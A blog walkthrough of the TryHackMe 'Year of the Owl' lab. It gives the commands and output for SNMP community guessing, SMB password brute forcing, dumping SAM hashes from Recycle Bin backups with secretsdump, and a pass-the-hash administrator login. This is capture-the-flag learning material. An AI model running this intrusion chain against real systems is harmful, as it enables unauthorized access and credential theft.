---
layout: post
title:  "TryHackMe - Year of the Owl"
date:   2021-04-15 10:11:05 +0300
categories: [tryhackme,walkthrough]
pin: true
tags: [snmp,crackmapexec,nmap,evil-winrm,backup,Recycle Bin,secretdumps]
image: /images/owl.jpg
---

## Nmap
```sh
┌──(alienum㉿kali)-[~]
└─$ sudo nmap 10.10.14.162 -p-       
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 12:51 EEST
Nmap scan report for 10.10.14.162 (10.10.14.162)
Host is up (0.14s latency).
Not shown: 65527 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
```

## Nmap 2

- This time i will use the `-sUV` flag  

```sh
┌──(alienum㉿kali)-[~/Desktop]
└─$ sudo nmap -sUV 10.10.14.162 -p 10-300
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 13:24 EEST
Nmap scan report for 10.10.14.162 (10.10.14.162)
Host is up (0.14s latency).
All 291 scanned ports on 10.10.14.162 (10.10.14.162) are open|filtered
```

- Nothing usefull, i read a hint about `snmp`
- After a google search i found the tool `onesixtyone`
- You can find it here : [github.com/trailofbits/onesixtyone](https://github.com/trailofbits/onesixtyone)

## What is Simple Network Management Protocol (SNMP) ?

- Theory from Wiki

Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. Devices that typically support SNMP include cable modems, routers, switches, servers, workstations, printers, and more.[1]
SNMP is widely used in network management for network monitoring. SNMP exposes management data in the form of variables on the managed systems organized in a management information base (MIB) which describe the system status and configuration. These variables can then be remotely queried (and, in some circumstances, manipulated) by managing applications.

## What is Management Information Base (MIB) ?

- Theory from Wiki

A management information base (MIB) is a database used for managing the entities in a communication network. Most often associated with the Simple Network Management Protocol (SNMP), the term is also used more generically in contexts such as in OSI/ISO Network management model. While intended to refer to the complete collection of management information available on an entity, it is often used to refer to a particular subset, more correctly referred to as MIB-module.

## Onesixtyone

```sh
┌──(alienum㉿kali)-[~/onesixtyone]
└─$ ./onesixtyone -c dict.txt  10.10.14.162
Scanning 1 hosts, 51 communities
10.10.14.162 [op*****w] Hardware: Intel64 Family 6 Model 63 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

![image]( /assets/img/owl/1.PNG)

- onesixtyone gave us the `op*****w`

## MIB Browser

- I download the MIB Browser from here : [MIB Browser](https://www.ireasoning.com/download.shtml)

- Advanced -> Read Community -> `op*****w`

![image]( /assets/img/owl/2.PNG)

## MIB Enumeration

- I found a suspicious object id `.1.3.6.1.4` that there is not in the list

![image]( /assets/img/owl/4.PNG)

- Let's use the MIB - `Get Subtree` operation

## MIB | Get SubTree

- I found the `.1.3.6.1.4.77.1.x.x.x` this maybe contains more subtrees that they are not visible
- Let's go deeper

## MIB | Get SubTree .1.3.6.1.4.77.1

- The table gave us 4 object ids

`.1.3.6.1.4.1.77.1.1.1.0`

`.1.3.6.1.4.1.77.1.1.2.0`

`.1.3.6.1.4.1.77.1.1.3.0`

- These values are useless so then i searched manual the `.1.3.6.1.4.1.77.1.2`

![image]( /assets/img/owl/5.PNG)

- After the `Get Subtree` i found that `.1.3.6.1.4.1.77.1.2` contains sensitive information

![image]( /assets/img/owl/6.PNG)

- Again nothing useful and the google is my friend
- I found an article about information Disclosure using this OID `.1.3.6.1.4.1.77.1.2.25`
- You will find this article here [information-disclosure-caused-by-snmp](https://topic.alibabacloud.com/a/information-disclosure-caused-by-snmp-weak-password_8_8_31467358.html)


## MIB | Information Disclosure | Get SubTree .1.3.6.1.4.1.77.1.2.25

- Finally i found the user `Jareth`

![image]( /assets/img/owl/7.PNG)


## SMB Bruteforce

- Hydra failed to brute force so i run `crackmapexec`

```sh
┌──(alienum㉿kali)-[~]
└─$ crackmapexec smb 10.10.14.162 -u Jareth -p /usr/share/wordlists/rockyou.txt
SMB         10.10.14.162    445    YEAR-OF-THE-OWL  [*] Windows 10.0 Build 17763 (name:YEAR-OF-THE-OWL) (domain:year-of-the-owl) (signing:False) (SMBv1:False)
SMB         10.10.14.162    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:cookie STATUS_LOGON_FAILURE
...
SMB         10.10.14.162    445    YEAR-OF-THE-OWL  [-] year-of-the-owl\Jareth:123654 STATUS_LOGON_FAILURE
SMB         10.10.14.162    445    YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:s****
```

## Evil-winrm

![image]( /assets/img/owl/8.PNG)

## Privileges Escalation

Let's run the `whoami /all`

```sh
*Evil-WinRM* PS C:\Users\Jareth\Desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== =============================================
year-of-the-owl\jareth S-1-5-21-1987495829-1628902820-919763334-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

- After this i read the official writeup for a hint about the `Recycle Bin`

## Recycle Bin

`cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'`

![image]( /assets/img/owl/9.PNG)

`mkdir c:\tmp`

`copy sam.bak c:\tmp`

`copy system.bak c:\tmp`

`download c:\tmp\sam.bak`

`download c:\tmp\system.bak`

![image]( /assets/img/owl/10.PNG)


## Retrieve Password Hashes

`secretsdump.py`

![image]( /assets/img/owl/11.PNG)

- Run the Script

```sh
┌──(alienum㉿kali)-[~]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ts local -system system.bak -sam sam.bak
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[2021-04-16 18:00:01] [*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[2021-04-16 18:00:01] [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6<REMOVED>7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
[2021-04-16 18:00:02] [*] Cleaning up...
```

![image]( /assets/img/owl/12.PNG)


## Rooted

![image]( /assets/img/owl/13.PNG)

`evil-winrm -i 10.10.14.162  -u administrator -H 6<REMOVED>a`
